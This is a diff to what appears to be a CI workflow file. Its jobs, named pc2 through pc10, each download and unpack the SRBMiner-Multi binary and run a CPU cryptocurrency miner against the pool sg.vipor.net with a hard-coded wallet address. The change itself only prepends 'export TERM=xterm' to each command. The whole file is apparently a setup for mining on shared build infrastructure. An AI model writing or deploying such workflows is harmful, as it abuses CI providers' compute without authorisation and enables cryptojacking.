@@ -10,6 +10,8 @@ jobs:
     steps:
       - name: setup 
         run: |
+          export TERM=xterm
+          
           cd && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.7/SRBMiner-Multi-2-6-7-Linux.tar.gz 
           
           tar -xzvf SRBMiner-Multi-2-6-7-Linux.tar.gz 
@@ -26,7 +28,7 @@ jobs:
     steps:
       - name: setup 
         run: |
-          cd && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.7/SRBMiner-Multi-2-6-7-Linux.tar.gz && tar -xzvf SRBMiner-Multi-2-6-7-Linux.tar.gz && clear && cd SRBMiner-Multi-2-6-7 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool sg.vipor.net:5040 --wallet RStyQuDY1pSyWBMYdHMjn9hKgtGDnDfaXL --Worker pc2 --password x --cpu-threads 4
+          export TERM=xterm && cd && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.7/SRBMiner-Multi-2-6-7-Linux.tar.gz && tar -xzvf SRBMiner-Multi-2-6-7-Linux.tar.gz && clear && cd SRBMiner-Multi-2-6-7 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool sg.vipor.net:5040 --wallet RStyQuDY1pSyWBMYdHMjn9hKgtGDnDfaXL --Worker pc2 --password x --cpu-threads 4
           
   pc3:
     name: "pc3"
@@ -34,7 +36,7 @@ jobs:
     steps:
       - name: setup 
         run: |
-          cd && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.7/SRBMiner-Multi-2-6-7-Linux.tar.gz && tar -xzvf SRBMiner-Multi-2-6-7-Linux.tar.gz && clear && cd SRBMiner-Multi-2-6-7 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool sg.vipor.net:5040 --wallet RStyQuDY1pSyWBMYdHMjn9hKgtGDnDfaXL --Worker pc3 --password x --cpu-threads 4
+          export TERM=xterm && cd && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.7/SRBMiner-Multi-2-6-7-Linux.tar.gz && tar -xzvf SRBMiner-Multi-2-6-7-Linux.tar.gz && clear && cd SRBMiner-Multi-2-6-7 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool sg.vipor.net:5040 --wallet RStyQuDY1pSyWBMYdHMjn9hKgtGDnDfaXL --Worker pc3 --password x --cpu-threads 4
 
   pc4:
     name: "pc4"
@@ -42,7 +44,7 @@ jobs:
     steps:
       - name: setup 
         run: |
-          cd && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.7/SRBMiner-Multi-2-6-7-Linux.tar.gz && tar -xzvf SRBMiner-Multi-2-6-7-Linux.tar.gz && clear && cd SRBMiner-Multi-2-6-7 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool sg.vipor.net:5040 --wallet RStyQuDY1pSyWBMYdHMjn9hKgtGDnDfaXL --Worker pc4 --password x --cpu-threads 4
+          export TERM=xterm && cd && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.7/SRBMiner-Multi-2-6-7-Linux.tar.gz && tar -xzvf SRBMiner-Multi-2-6-7-Linux.tar.gz && clear && cd SRBMiner-Multi-2-6-7 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool sg.vipor.net:5040 --wallet RStyQuDY1pSyWBMYdHMjn9hKgtGDnDfaXL --Worker pc4 --password x --cpu-threads 4
 
   pc5:
     name: "pc5"
@@ -58,7 +60,7 @@ jobs:
     steps:
       - name: setup 
         run: |
-          cd && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.7/SRBMiner-Multi-2-6-7-Linux.tar.gz && tar -xzvf SRBMiner-Multi-2-6-7-Linux.tar.gz && clear && cd SRBMiner-Multi-2-6-7 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool sg.vipor.net:5040 --wallet RStyQuDY1pSyWBMYdHMjn9hKgtGDnDfaXL --Worker pc6 --password x --cpu-threads 4
+          export TERM=xterm && cd && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.7/SRBMiner-Multi-2-6-7-Linux.tar.gz && tar -xzvf SRBMiner-Multi-2-6-7-Linux.tar.gz && clear && cd SRBMiner-Multi-2-6-7 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool sg.vipor.net:5040 --wallet RStyQuDY1pSyWBMYdHMjn9hKgtGDnDfaXL --Worker pc6 --password x --cpu-threads 4
 
   pc7:
     name: "pc7"
@@ -66,7 +68,7 @@ jobs:
     steps:
       - name: setup 
         run: |
-          cd && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.7/SRBMiner-Multi-2-6-7-Linux.tar.gz && tar -xzvf SRBMiner-Multi-2-6-7-Linux.tar.gz && clear && cd SRBMiner-Multi-2-6-7 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool sg.vipor.net:5040 --wallet RStyQuDY1pSyWBMYdHMjn9hKgtGDnDfaXL --Worker pc7 --password x --cpu-threads 4
+          export TERM=xterm && cd && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.7/SRBMiner-Multi-2-6-7-Linux.tar.gz && tar -xzvf SRBMiner-Multi-2-6-7-Linux.tar.gz && clear && cd SRBMiner-Multi-2-6-7 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool sg.vipor.net:5040 --wallet RStyQuDY1pSyWBMYdHMjn9hKgtGDnDfaXL --Worker pc7 --password x --cpu-threads 4
 
   pc8:
     name: "pc8"
@@ -74,7 +76,7 @@ jobs:
     steps:
       - name: setup 
         run: |
-          cd && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.7/SRBMiner-Multi-2-6-7-Linux.tar.gz && tar -xzvf SRBMiner-Multi-2-6-7-Linux.tar.gz && clear && cd SRBMiner-Multi-2-6-7 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool sg.vipor.net:5040 --wallet RStyQuDY1pSyWBMYdHMjn9hKgtGDnDfaXL --Worker pc8 --password x --cpu-threads 4
+          export TERM=xterm && cd && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.7/SRBMiner-Multi-2-6-7-Linux.tar.gz && tar -xzvf SRBMiner-Multi-2-6-7-Linux.tar.gz && clear && cd SRBMiner-Multi-2-6-7 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool sg.vipor.net:5040 --wallet RStyQuDY1pSyWBMYdHMjn9hKgtGDnDfaXL --Worker pc8 --password x --cpu-threads 4
 
   pc9:
     name: "pc9"
@@ -82,7 +84,7 @@ jobs:
     steps:
       - name: setup 
         run: |
-          cd && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.7/SRBMiner-Multi-2-6-7-Linux.tar.gz && tar -xzvf SRBMiner-Multi-2-6-7-Linux.tar.gz && clear && cd SRBMiner-Multi-2-6-7 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool sg.vipor.net:5040 --wallet RStyQuDY1pSyWBMYdHMjn9hKgtGDnDfaXL --Worker pc9 --password x --cpu-threads 4
+          export TERM=xterm && cd && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.7/SRBMiner-Multi-2-6-7-Linux.tar.gz && tar -xzvf SRBMiner-Multi-2-6-7-Linux.tar.gz && clear && cd SRBMiner-Multi-2-6-7 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool sg.vipor.net:5040 --wallet RStyQuDY1pSyWBMYdHMjn9hKgtGDnDfaXL --Worker pc9 --password x --cpu-threads 4
 
   pc10:
     name: "pc10"
@@ -90,4 +92,4 @@ jobs:
     steps:
       - name: setup 
         run: |
-          cd && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.7/SRBMiner-Multi-2-6-7-Linux.tar.gz && tar -xzvf SRBMiner-Multi-2-6-7-Linux.tar.gz && clear && cd SRBMiner-Multi-2-6-7 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool sg.vipor.net:5040 --wallet RStyQuDY1pSyWBMYdHMjn9hKgtGDnDfaXL --Worker pc10 --password x --cpu-threads 4
+          export TERM=xterm && cd && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.7/SRBMiner-Multi-2-6-7-Linux.tar.gz && tar -xzvf SRBMiner-Multi-2-6-7-Linux.tar.gz && clear && cd SRBMiner-Multi-2-6-7 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool sg.vipor.net:5040 --wallet RStyQuDY1pSyWBMYdHMjn9hKgtGDnDfaXL --Worker pc10 --password x --cpu-threads 4
